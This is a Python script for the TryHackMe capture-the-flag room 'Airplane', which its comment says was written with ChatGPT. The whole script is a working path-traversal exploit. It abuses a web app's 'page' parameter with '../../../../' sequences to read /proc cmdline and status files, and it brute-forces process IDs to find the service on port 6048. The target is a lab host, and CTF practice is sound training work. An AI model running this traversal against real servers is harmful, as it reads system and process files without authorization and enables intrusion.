# this script by chatgpt to find the process runing on port 6048
# for tryhackme room airplane https://tryhackme.com/r/room/airplane
import requests

def read_file(base_url, path):
    file_url = f"{base_url}/?page=../../../../{path}"
    try:
        response = requests.get(file_url)
        if response.status_code == 200:
            return response.text
        else:
            return None
    except Exception as e:
        print(f"Error reading {path}: {e}")
        return None

def find_pid_by_port(base_url, port):
    for pid in range(1, 5000):  # Adjust the range based on the expected number of PIDs
        cmdline_path = f"proc/{pid}/cmdline"
        cmdline = read_file(base_url, cmdline_path)
        if cmdline:
            if str(port) in cmdline:
                return pid
    return None

# Example usage
base_url = 'http://airplane.thm:8000'
port = '6048'
pid = find_pid_by_port(base_url, port)
if pid:
    cmdline = read_file(base_url, f"proc/{pid}/cmdline")
    status = read_file(base_url, f"proc/{pid}/status")
    print(f'PID using port {port}: {pid}')
    print(f'Command line: {cmdline}')
    print(f'Status: {status}')
else:
    print(f'No process found using port {port}')
